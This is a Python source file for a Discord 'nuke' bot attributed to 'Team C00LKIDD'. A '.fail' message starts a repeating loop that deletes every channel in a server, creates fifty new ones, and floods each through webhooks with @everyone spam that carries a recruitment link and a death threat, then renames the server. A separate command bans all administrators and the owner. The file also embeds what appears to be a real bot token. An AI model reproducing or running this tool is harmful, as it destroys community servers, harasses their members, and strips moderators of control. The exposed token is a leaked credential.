import discord
import asyncio
from discord.ext import commands

TOKEN = "MTQwMjMwODMyOTczNjI0MTI3Mw.Gsrqg1.rr9Y-ZwcN2ZeW-R-90wYrLrBW25H6kWi_O1TJc"  # Replace with your actual token

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
nuke_active = False


async def create_and_spam_webhook(channel):
    try:
        webhook = await channel.create_webhook(name="Coolkid")
        print(f"Created webhook in {channel.name}")

        for _ in range(200):
            try:
                await webhook.send(
                    "@everyone @here dumb skids\n"
                    "# **TEAM C00LKIDD OWNS YOU**\n"
                    "```diff\n-Team c00lkidd join today```\n"
                    "[join or ill kill you](https://discord.gg/Teamc00lkidd)\n"
                    "https://media.discordapp.net/attachments/1215053612028526653/1219435249763750028/1218622476645564527_1650x1080.gif\n"
                    "https://tenor.com/view/rgb-gif-24155293",
                    wait=False
                )
            except:
                pass
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Webhook error in {channel.name}: {e}")


@bot.command()
@commands.has_permissions(ban_members=True)
async def ban_admins_and_owner(ctx):
    guild = ctx.guild
    bot_member = guild.get_member(ctx.bot.user.id)
    banned = []
    skipped = []

    for member in guild.members:
        if member == bot_member:
            continue

        if member.guild_permissions.administrator or member == guild.owner:
            try:
                await member.ban(reason="Banned by bot (admin/owner).")
                banned.append(str(member))
            except Exception as e:
                print(f"Could not ban {member}: {e}")
                skipped.append(str(member))
        else:
            skipped.append(str(member))

    response = []

    if banned:
        response.append(f"✅ Banned: {', '.join(banned)}")
    if skipped:
        response.append(f"⚠️ Skipped: {', '.join(skipped)}")

    await ctx.send("\n".join(response) if response else "No users processed.")


async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"Deleted {channel.name}")
    except Exception as e:
        print(f"Failed to delete {channel.name}: {e}")


async def create_channel(guild, name):
    try:
        channel = await guild.create_text_channel(name)
        print(f"Created {channel.name}")
        return channel
    except Exception as e:
        print(f"Failed to create channel {name}: {e}")
        return None


async def nuke_loop(guild):  # guild is passed in from .fail
    global nuke_active
    while nuke_active:
        # Delete all channels
        delete_tasks = [delete_channel(ch) for ch in guild.channels]
        await asyncio.gather(*delete_tasks)

        # Create channels
        channel_names = [f"Nuked-by-CK-{i}" for i in range(50)]
        create_tasks = [create_channel(guild, name) for name in channel_names]
        channels = await asyncio.gather(*create_tasks)

        # Remove failed channels
        channels = [ch for ch in channels if ch is not None]

        # Spam webhooks
        await asyncio.gather(*(create_and_spam_webhook(ch) for ch in channels))

        # Rename server
        try:
            await guild.edit(name="CK-NUKED")
        except Exception:
            pass

        print(f"Nuke cycle complete on {guild.name}. Restarting in 4 seconds...")
        await asyncio.sleep(4)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")


@bot.event
async def on_message(message):
    global nuke_active

    if message.content == ".fail" and not nuke_active:
        if message.guild is not None:
            nuke_active = True
            await message.channel.send("GET NUKED BY TEAM COOLKID")
            bot.loop.create_task(nuke_loop(message.guild))

    await bot.process_commands(message)


bot.run(TOKEN)
